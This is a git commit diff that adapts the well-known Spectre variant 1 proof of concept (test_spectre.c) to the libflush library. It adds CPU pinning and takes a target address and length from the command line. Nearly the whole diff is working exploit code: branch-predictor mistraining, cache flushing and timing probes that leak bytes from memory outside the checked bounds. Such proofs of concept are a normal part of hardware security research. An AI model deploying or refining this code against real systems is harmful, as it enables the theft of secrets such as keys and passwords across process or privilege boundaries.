607b99520a1a58dce94c291fb2181700da3913ac
Paulo Costa <me@paulo.costa.nom.br>
2018-01-17 15:46:28 -0200

    use libflush

--- test_spectre.c
+++ test_spectre.c
@@ -1,5 +1,6 @@
-
+#include <libflush.h>
 #include <stdio.h>
+#include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
 #ifdef _MSC_VER
@@ -51,7 +52,8 @@ Analysis code
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, uint8_t value[2], int score[2]) {
+  size_t malicious_x = (size_t)(target_ptr - array1);
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
@@ -64,12 +66,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
-      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+      libflush_flush(libflush_session, & array2[i * 512]); /* intrinsic for clflush instruction */
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
-      _mm_clflush( & array1_size);
+      libflush_flush(libflush_session, & array1_size);
       for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
@@ -91,7 +93,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-        results[mix_i]++; /* cache hit - add +1 to score for this value */
+          results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
@@ -114,30 +116,53 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   score[1] = results[k];
 }
 
-int main(int argc,
-  const char * * argv) {
-  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
-  int i, score[2], len = 40;
-  uint8_t value[2];
 
-  for (i = 0; i < sizeof(array2); i++)
-    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+#define MAIN_THREAD_CPU 0
+#define COUNTER_THREAD_CPU 1
+int main(int argc, const char** argv) {
+  // Read CLI arguments: data pointer and lenght
+  uint8_t* target_ptr = "The Magic Words are Squeamish Ossifrage.";
+  int target_len = strlen(target_ptr);
+
   if (argc == 3) {
-    sscanf(argv[1], "%p", (void * * )( & malicious_x));
-    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
-    sscanf(argv[2], "%d", & len);
+    sscanf(argv[1], "%p", &target_ptr);
+    sscanf(argv[2], "%d", & target_len);
   }
 
-  printf("Reading %d bytes:\n", len);
-  while (--len >= 0) {
-    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-    readMemoryByte(malicious_x++, value, score);
+  // Initialize libflush
+  libflush_session_args_t args = {
+    .bind_to_cpu = COUNTER_THREAD_CPU
+  };
+  libflush_session_t* libflush_session;
+  if (libflush_init(&libflush_session, &args) == false) {
+    fprintf(stderr, "Error: Could not initialize libflush\n");
+    return -1;
+  }
+  if (libflush_bind_to_cpu(MAIN_THREAD_CPU) == false) {
+    fprintf(stderr, "Warning: Could not bind main thread to CPU %d\n", MAIN_THREAD_CPU);
+    return -1;
+  }
+
+  memset(array2, 0, sizeof(array2));  /* write to array2 so in RAM not copy-on-write zero pages */
+  printf("Reading %d bytes:\n", target_len);
+  while (target_len--) {
+    uint8_t value[2];
+    int score[2];
+
+    printf("Reading at %p... ", (void*) target_ptr);
+    readMemoryByte(libflush_session, target_ptr++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
+  }
+
+  // terminate libflush
+  if (libflush_terminate(libflush_session) == false) {
+    fprintf(stderr, "Error: Could not terminate libflush\n");
+    return -1;
   }
   return (0);
 }
